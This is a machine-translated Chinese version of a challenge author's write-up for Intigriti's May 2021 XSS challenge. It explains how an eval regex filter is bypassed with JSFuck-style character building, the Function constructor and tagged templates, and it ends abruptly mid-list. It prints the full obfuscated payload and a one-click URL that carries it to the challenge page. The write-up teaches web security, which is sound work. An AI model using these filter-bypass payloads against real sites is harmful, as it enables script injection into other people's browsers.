<html>
<head>
<title>Solution and explanation of tips for Intigriti’s 0521 XSS challenge — by @GrumpinouT</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Intigriti的0521 XSS挑战赛技巧解答和解释——作者@GrumpinouT</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/solution-and-explanation-of-tips-for-intigritis-0521-xss-challenge-by-grumpinout-7544bad98e59?source=collection_archive---------3-----------------------#2021-06-07">https://infosecwriteups.com/solution-and-explanation-of-tips-for-intigritis-0521-xss-challenge-by-grumpinout-7544bad98e59?source=collection_archive---------3-----------------------#2021-06-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/7d406c8f261e15477f6a1a4ca1ec6101.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZbX2MMHlVBC3lmquuqu_6w.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">挑战页面</figcaption></figure><p id="916e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">本月(2021年5月)Intigriti的XSS挑战赛是我创作的(Inti做了一些补充)。在这篇文章中，我将解释我对这个挑战的解决方案和给出的提示。</p><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="le lf l"/></div></figure><h1 id="625a" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">侦察</h1><p id="f80c" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">在应用程序中，给出了两个随机数，第一个数加上用户输入的数的和必须产生第二个数。点击提交后，会显示一个进度条，当进度条已满时。用户将收到一条消息。</p><p id="78ee" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果等式是正确的，消息将声明用户不是机器人。否则，用户将被告知他是一个机器人。</p><p id="c3c7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在查看了应用程序的代码后，我们看到功能实际上存储在页面<code class="fe mj mk ml mm b">captcha.php</code>上，并通过iframe加载。</p><figure class="la lb lc ld gt jr gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/90ac51c36de617c74b5cdb61b3c432ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1226/format:webp/1*pbxbiAY3N-ofa6xTyfXXUQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">含有captcha.php的Iframe</figcaption></figure><p id="7f87" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果我们去看看captcha.php，我们可以看到用户的输入将与两个随机数一起被添加到<code class="fe mj mk ml mm b">operation</code>变量中。之后，用下面的regex <code class="fe mj mk ml mm b">/[a-df-z&lt;&gt;()!\\='"]/gi</code>进行检查，并有一个注释来解释为什么字母<code class="fe mj mk ml mm b">e</code>是允许的。</p><p id="4860" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">一旦输入通过了正则表达式，它将在<code class="fe mj mk ml mm b">eval</code>函数中执行。所以我们要做的就是找到一个正则表达式允许的有效载荷，我们解决了这个挑战。</p><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/c60f29a7a9ca2c0fbbf95300102d3127.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hykh8O3MYgK0fFuXPKZpLQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">带有regex和eval的JavaScript代码</figcaption></figure><h1 id="703d" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">正在构建“alert(document.domain)”</h1><p id="9449" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">这一部分我不会讲太多细节，因为这会使这篇文章很长，但是解决方案是基于这样一个事实，即字符串可以用一种类似于<a class="ae mp" href="https://github.com/aemkei/jsfuck" rel="noopener ugc nofollow" target="_blank"> JSFuck </a>的方式来检索所需的字符。我用了三个字符串来得到最终的有效载荷。第一个是<code class="fe mj mk ml mm b">"undefined"</code>，如下图，很容易检索到。</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="d569" class="mu lh iq mm b gy mv mw l mx my">[[][0]+[]][0][2] = "undefined"</span></pre><p id="1a82" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><code class="fe mj mk ml mm b">[][0]</code>给了我们<code class="fe mj mk ml mm b">undefined</code>，但不是作为字符串，所以我们还不能检索必要的字符。要将它作为一个字符串获取，我们需要将<code class="fe mj mk ml mm b">[]</code>添加到它，将整个部分放入一个数组中，并使用索引0再次检索它。</p><p id="d684" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">接下来，使用之前检索到的字母，我们可以访问一个新的字符串，这使我们可以访问更多的字符。出于简单性和可读性，我没有对检索这个字符串所需的字符进行编码。您可能不知道这一点，但是在JavaScript中可以通过两种方式访问对象的属性。作为一个例子，我将使用文档对象。要检索域参数，可以像这样做<code class="fe mj mk ml mm b">document.domain</code>，或者像这样做<code class="fe mj mk ml mm b">document["domain"]</code>，解决方案需要最后一个技巧。下面的<code class="fe mj mk ml mm b">find</code>属性是访问一个空数组。使用了与undefined相同的概念来检索字符串。</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="bb28" class="mu lh iq mm b gy mv mw l mx my">[[]["find"]+[]][0] = "function find() { [native code] }"</span></pre><p id="394e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">有了这两个字符串，我们几乎拥有了所有需要的字符，但我们还需要更多。为此，需要字母<code class="fe mj mk ml mm b">e</code>。</p><figure class="la lb lc ld gt jr gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/3c9b1b8980e7f8635c558f606d89c662.png" data-original-src="https://miro.medium.com/v2/resize:fit:1102/format:webp/1*lcLpEYaFZj3LytPo3KM9Wg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">表单的HTML</figcaption></figure><p id="1aaf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">正如你在上面的图片中看到的，进度条有id <code class="fe mj mk ml mm b">e</code>。html元素可以用它的id来访问，如下所示。</p><figure class="la lb lc ld gt jr gh gi paragraph-image"><div class="gh gi na"><img src="../Images/0f0574eea60774a6c791b0ce12400cfa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*ZOeeRlyyDki_IAcC_3nnxg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">使用id访问进度条</figcaption></figure><p id="5ac1" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">有了这些知识，我们可以重新获得一个新的字符串，它包含了更多我们需要的字符。</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="f206" class="mu lh iq mm b gy mv mw l mx my">[e+1][0] = "[object HTMLProgressElement]1"</span></pre><p id="d7e9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果我们现在对<code class="fe mj mk ml mm b">alert(document.domain)</code>进行编码，我们会得到下面的有效负载(尽管正则表达式不允许使用单引号和双引号，但是我们可以用反斜线(`)绕过它，所以如果我们需要将<code class="fe mj mk ml mm b">.</code>和<code class="fe mj mk ml mm b">e</code>作为一个字符串，就不需要对它们进行编码。</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="d012" class="mu lh iq mm b gy mv mw l mx my">[[][[[][[]]+[]][+[]][4]+[[][[]]+[]][+[]][5]+[[][[]]+[]][+[]][1]+[[][[]]+[]][+[]][2]]+[]][0][20]+[e+1][0][21]+`e`+[e+1][0][16]+[e+1][0][6]+[[][[e+1[0]][0][32]+[e+1[0]][0][33]+[e+1[0]][0][34]+[e+1[0]][0][36]]+[]][0][13]+[[][0]+[]][0][2]+[e+1][0][1]+[e+1][0][5]+[e+1[0]][0][28]+[e+1][0][23]+[e+1][0][4]+[e+1][0][25]+[e+1][0][26]+`.`+[[][0]+[]][0][2]+[e+1][0][1]+[e+1][0][23]+[[][[[][[]]+[]][+[]][4]+[[][[]]+[]][+[]][5]+[[][[]]+[]][+[]][1]+[[][[]]+[]][+[]][2]]+[]][0][20]+[[][0]+[]][0][5]+[e+1][0][25]+[[][[e+1[0]][0][32]+[e+1[0]][0][33]+[e+1[0]][0][34]+[e+1[0]][0][36]]+[]][0][14]</span></pre><p id="a248" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果我们在挑战页面上尝试，没有什么有趣的事情发生…</p><p id="a0b9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这是因为如果有效载荷被执行，我们只是得到字符串<code class="fe mj mk ml mm b">"alert(document.domain)"</code>作为返回，而不是实际的函数。</p><h1 id="19cf" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">执行警报</h1><p id="6c8b" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">为了执行警报字符串，我们需要一个函数构造器。这个函数返回一个匿名函数，其中的参数是构造函数中的前n个参数，主体是最后一个。然后，可以通过在末尾添加括号(由于正则表达式的原因，我们不能使用括号)来调用匿名函数，如下所示:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="ffe7" class="mu lh iq mm b gy mv mw l mx my">Function(“param1”, “alert()”)()</span></pre><p id="10f2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">通过访问一个空数组的属性，我们可以像获取find函数一样获取这个函数。首先我们获得数组的构造函数属性，它返回创建对象实例的函数，在本例中是<code class="fe mj mk ml mm b">Array()</code>。这个实例是由<code class="fe mj mk ml mm b">Function()</code>创建的，可以通过再次调用构造函数属性来访问。我们现在可以用反斜线来代替括号。</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="6b60" class="mu lh iq mm b gy mv mw l mx my">[]["constructor"]["constructor"]`"alert(document.domain)"```</span></pre><p id="689f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">但是如果我们执行这个函数，我们会得到一个未定义的返回，并且不会触发警报。如果我们检查构造函数的输出，而不调用它(读:删除最后两个反勾号)，那么我们得到下面的输出:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="23a6" class="mu lh iq mm b gy mv mw l mx my">ƒ anonymous(<br/>) {<br/>"alert(document.domain)"<br/>}</span></pre><p id="ec9c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如您所见，警报被放在引号中，因此不会通过调用函数来执行。</p><p id="03d0" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">为了解决这个问题，我们可以将字符串放在模板文字占位符中。目前，我们正在使用带标签的模板。</p><p id="5789" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">当您将字符串放入占位符中时，您仍然会在执行时收到一个关于逗号的错误。</p><figure class="la lb lc ld gt jr gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/5be39aa94c01ad2e055fb3d179ade985.png" data-original-src="https://miro.medium.com/v2/resize:fit:980/format:webp/1*-X-3LNzcNMgZM8iPc4TZoQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">构造函数出错</figcaption></figure><p id="3133" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果我们看一下<a class="ae mp" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals" rel="noopener ugc nofollow" target="_blank">标记模板</a>的Mozilla文档，我们注意到如果我们有下面的模板文字:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="e9e7" class="mu lh iq mm b gy mv mw l mx my">`string1 ${"alert(document.domain)"} string2`</span></pre><p id="725f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">它被传递给函数构造函数，如下所示:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="c591" class="mu lh iq mm b gy mv mw l mx my">Function([“string1”, “string2”], “alert(document.domain)”)</span></pre><p id="7cd4" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如前所述，第一个参数是匿名函数的参数，由于某种原因，当数组中的值从数组中移除并像这样传递时，前面的代码做了完全相同的事情(见下面的示例)。</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="4e34" class="mu lh iq mm b gy mv mw l mx my">Function(“string1”, “string2”, “alert(document.domain)”)</span></pre><p id="52eb" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">当模板文字不包含任何字符串时，一个包含两个空字符串的数组将被传递给<code class="fe mj mk ml mm b">Function()</code>。在这种情况下，输出应该是:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="9b50" class="mu lh iq mm b gy mv mw l mx my">ƒ anonymous(,<br/>) {<br/>alert()<br/>}</span></pre><p id="38e9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">由于该函数中有两个空字符串用作参数，因此引发了错误。解决方法是在占位符前像这样添加一个字符，这样输出就不会抛出错误，看起来像这样:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="4bb7" class="mu lh iq mm b gy mv mw l mx my">ƒ anonymous($,<br/>) {<br/>alert()<br/>}</span></pre><h1 id="4ebf" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">最终有效载荷</h1><p id="54ed" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">最终的有效载荷如下所示:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="e025" class="mu lh iq mm b gy mv mw l mx my">[][[e+1][0][5]+[e+1][0][1]+[e+1][0][25]+[e+1][0][19]+[e+1][0][6]+[e+1][0][16]+[e+1[0]][0][28]+[e+1][0][5]+[e+1][0][6]+[e+1][0][1]+[e+1][0][16]][[e+1][0][5]+[e+1][0][1]+[e+1][0][25]+[e+1][0][19]+[e+1][0][6]+[e+1][0][16]+[e+1[0]][0][28]+[e+1][0][5]+[e+1][0][6]+[e+1][0][1]+[e+1][0][16]]`$${[[][[[][[]]+[]][+[]][4]+[[][[]]+[]][+[]][5]+[[][[]]+[]][+[]][1]+[[][[]]+[]][+[]][2]]+[]][0][20]+[e+1][0][21]+`e`+[e+1][0][16]+[e+1][0][6]+[[][[e+1[0]][0][32]+[e+1[0]][0][33]+[e+1[0]][0][34]+[e+1[0]][0][36]]+[]][0][13]+[[][0]+[]][0][2]+[e+1][0][1]+[e+1][0][5]+[e+1[0]][0][28]+[e+1][0][23]+[e+1][0][4]+[e+1][0][25]+[e+1][0][26]+`.`+[[][0]+[]][0][2]+[e+1][0][1]+[e+1][0][23]+[[][[[][[]]+[]][+[]][4]+[[][[]]+[]][+[]][5]+[[][[]]+[]][+[]][1]+[[][[]]+[]][+[]][2]]+[]][0][20]+[[][0]+[]][0][5]+[e+1][0][25]+[[][[e+1[0]][0][32]+[e+1[0]][0][33]+[e+1[0]][0][34]+[e+1[0]][0][36]]+[]][0][14]}```</span></pre><p id="abe7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">翻译过来就是:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="dad3" class="mu lh iq mm b gy mv mw l mx my">[]["constructor"]["constructor"]`${"alert(document.domain)"}```</span></pre><h1 id="8c6c" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">不断升级的自我XSS</h1><p id="bf44" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">为了升级自我XSS，需要做一点猜测工作，但这应该没那么难。有效负载可以通过GET或POST请求在<code class="fe mj mk ml mm b">b</code>或<code class="fe mj mk ml mm b">c</code>参数中发送(这些参数是受这些参数影响的元素的id)。有效载荷应该被编码，因为否则+将被作为空格处理。</p><h1 id="2708" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">无线一键通</h1><p id="3557" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">第一步:<a class="ae mp" href="https://challenge-0521.intigriti.io/captcha.php?c=%5B%5D%5B%5Be%2B1%5D%5B0%5D%5B5%5D%2B%5Be%2B1%5D%5B0%5D%5B1%5D%2B%5Be%2B1%5D%5B0%5D%5B25%5D%2B%5Be%2B1%5D%5B0%5D%5B19%5D%2B%5Be%2B1%5D%5B0%5D%5B6%5D%2B%5Be%2B1%5D%5B0%5D%5B16%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B28%5D%2B%5Be%2B1%5D%5B0%5D%5B5%5D%2B%5Be%2B1%5D%5B0%5D%5B6%5D%2B%5Be%2B1%5D%5B0%5D%5B1%5D%2B%5Be%2B1%5D%5B0%5D%5B16%5D%5D%5B%5Be%2B1%5D%5B0%5D%5B5%5D%2B%5Be%2B1%5D%5B0%5D%5B1%5D%2B%5Be%2B1%5D%5B0%5D%5B25%5D%2B%5Be%2B1%5D%5B0%5D%5B19%5D%2B%5Be%2B1%5D%5B0%5D%5B6%5D%2B%5Be%2B1%5D%5B0%5D%5B16%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B28%5D%2B%5Be%2B1%5D%5B0%5D%5B5%5D%2B%5Be%2B1%5D%5B0%5D%5B6%5D%2B%5Be%2B1%5D%5B0%5D%5B1%5D%2B%5Be%2B1%5D%5B0%5D%5B16%5D%5D%60%24%24%7B%5B%5B%5D%5B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B4%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B5%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B1%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B2%5D%5D%2B%5B%5D%5D%5B0%5D%5B20%5D%2B%5Be%2B1%5D%5B0%5D%5B21%5D%2B%60e%60%2B%5Be%2B1%5D%5B0%5D%5B16%5D%2B%5Be%2B1%5D%5B0%5D%5B6%5D%2B%5B%5B%5D%5B%5Be%2B1%5B0%5D%5D%5B0%5D%5B32%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B33%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B34%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B36%5D%5D%2B%5B%5D%5D%5B0%5D%5B13%5D%2B%5B%5B%5D%5B0%5D%2B%5B%5D%5D%5B0%5D%5B2%5D%2B%5Be%2B1%5D%5B0%5D%5B1%5D%2B%5Be%2B1%5D%5B0%5D%5B5%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B28%5D%2B%5Be%2B1%5D%5B0%5D%5B23%5D%2B%5Be%2B1%5D%5B0%5D%5B4%5D%2B%5Be%2B1%5D%5B0%5D%5B25%5D%2B%5Be%2B1%5D%5B0%5D%5B26%5D%2B%60.%60%2B%5B%5B%5D%5B0%5D%2B%5B%5D%5D%5B0%5D%5B2%5D%2B%5Be%2B1%5D%5B0%5D%5B1%5D%2B%5Be%2B1%5D%5B0%5D%5B23%5D%2B%5B%5B%5D%5B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B4%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B5%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B1%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B2%5D%5D%2B%5B%5D%5D%5B0%5D%5B20%5D%2B%5B%5B%5D%5B0%5D%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5Be%2B1%5D%5B0%5D%5B25%5D%2B%5B%5B%5D%5B%5Be%2B1%5B0%5D%5D%5B0%5D%5B32%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B33%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B34%5D%2B%5Be%2B1%5B0%5D%5D%5B0%5D%5B36%5D%5D%2B%5B%5D%5D%5B0%5D%5B14%5D%7D%60%60%60" rel="noopener ugc nofollow" target="_blank">点击此处</a>打开网页，输入栏<br/>预填有效载荷第二步:点击提交</p><h1 id="46a5" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">解释技巧</h1><h2 id="1224" class="mu lh iq bd li nc nd dn lm ne nf dp lq kn ng nh lu kr ni nj ly kv nk nl mc nm bi translated">提示1</h2><p id="50c7" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">这是对接收必要字符所需的字母<code class="fe mj mk ml mm b">e</code>的引用。如果你点击了视频，你会听到蕾哈娜唱“e e e e e e…</p><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="le lf l"/></div></figure><h2 id="32af" class="mu lh iq bd li nc nd dn lm ne nf dp lq kn ng nh lu kr ni nj ly kv nk nl mc nm bi translated">提示2</h2><p id="dc56" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">这里暗示了有效载荷中使用的方括号和花括号。</p><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="le lf l"/></div></figure><h2 id="cebc" class="mu lh iq bd li nc nd dn lm ne nf dp lq kn ng nh lu kr ni nj ly kv nk nl mc nm bi translated">提示3</h2><p id="4100" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">由于Travis以前在建筑行业工作过，我认为将他包括在技巧中是很好的，单词“construction”已经改为“constructor ”,作为对执行代码所必需的函数构造函数的引用。</p><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="le lf l"/></div></figure><h2 id="8ff0" class="mu lh iq bd li nc nd dn lm ne nf dp lq kn ng nh lu kr ni nj ly kv nk nl mc nm bi translated">提示4</h2><p id="6336" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">最后一个技巧是提示通过索引检索字符的方式。</p><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="le lf l"/></div></figure><h2 id="23e5" class="mu lh iq bd li nc nd dn lm ne nf dp lq kn ng nh lu kr ni nj ly kv nk nl mc nm bi translated">提示5</h2><p id="c9c3" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">实际上并没有发布提示5，但是如果公告推文收到了500个赞，下面的提示就会被发布:</p><blockquote class="nn no np"><p id="75fa" class="kc kd nq ke b kf kg kh ki kj kk kl km nr ko kp kq ns ks kt ku nt kw kx ky kz ij bi translated">一个捉人游戏是如何运作的？</p></blockquote><p id="72da" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">作为对用于绕过括号限制的标记函数的引用。</p><h1 id="3d56" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">这项挑战的灵感</h1><p id="8981" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">由于我从未见过使用JSFuck的XSS挑战赛，所以我想在挑战赛中加入一些类似的东西，这样参与者就可以了解其背后的想法。当然，复制粘贴一个JSFuck有效载荷太容易了。我在网上做了一些研究，发现了一篇我以前读过的文章。</p><p id="ba78" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这篇文章被<a class="ae mp" href="https://twitter.com/garethheyes" rel="noopener ugc nofollow" target="_blank"> @garethheyes </a>称为“<a class="ae mp" href="https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis" rel="noopener ugc nofollow" target="_blank">执行无括号</a>的非字母数字JavaScript”。</p><p id="f3f6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我开始研究文章中使用的有效负载，以找出哪些字符可以被删除/替换为其他字符。我从去掉感叹号开始，但是后来很多技巧都不再可行了，因为没有感叹号带给我们的布尔值，就没有办法得到数字。为了弥补这个限制，我决定在有效载荷中允许数字。现在只剩下三个字符需要得到(<code class="fe mj mk ml mm b">r</code>、<code class="fe mj mk ml mm b">m</code>和<code class="fe mj mk ml mm b">s</code>)。我选择使用进度条，这是我发现的唯一一个可以访问这三个元素的元素。我知道我可以使用一个像iframe这样的元素，它只提供对<code class="fe mj mk ml mm b">r</code>和<code class="fe mj mk ml mm b">m</code>的访问，这样就可以用<code class="fe mj mk ml mm b">e["outerHTML"]</code>检索s，返回如下内容:</p><pre class="la lb lc ld gt mq mm mr ms aw mt bi"><span id="b768" class="mu lh iq mm b gy mv mw l mx my">"&lt;iframe src=\"./captcha.php\" width=\"450\" height=\"90\" frameborder=\"0\" id=\"e\"&gt;&lt;/iframe&gt;"</span></pre><p id="b2b9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">但是我不想过多地限制用户。我只是想让他们理解以下概念:</p><ul class=""><li id="fea6" class="nu nv iq ke b kf kg kj kk kn nw kr nx kv ny kz nz oa ob oc bi translated">使用有限数量的字符执行JavaScript</li><li id="bb29" class="nu nv iq ke b kf od kj oe kn of kr og kv oh kz nz oa ob oc bi translated">使用函数构造函数</li><li id="fa89" class="nu nv iq ke b kf od kj oe kn of kr og kv oh kz nz oa ob oc bi translated">执行不带括号的函数</li><li id="abbe" class="nu nv iq ke b kf od kj oe kn of kr og kv oh kz nz oa ob oc bi translated">了解标记模板</li></ul><p id="9414" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">尽管只理解其中一些要点就能找到解决方案是可能的，但参与者了解到这些概念的存在，如果他们愿意，可以对其进行更多的研究。</p><p id="60d9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">例如，有人可以通过复制G. Heyes的方法，在不知道函数构造函数如何工作的情况下找到解决方案。我就是这样开始的，但是因为这个挑战，我开始研究所有的概念是如何工作的。</p><h1 id="ec93" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">最后的话</h1><p id="37ef" class="pw-post-body-paragraph kc kd iq ke b kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv mi kx ky kz ij bi translated">感谢大家的参与和良好的反馈！我真的很喜欢看你所有的报告！</p><p id="787f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">也非常感谢所有填写我的调查的人！这对我的论文很有帮助。</p><p id="6c61" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我从这次挑战中学到了一些东西:</p><ul class=""><li id="6eed" class="nu nv iq ke b kf kg kj kk kn nw kr nx kv ny kz nz oa ob oc bi 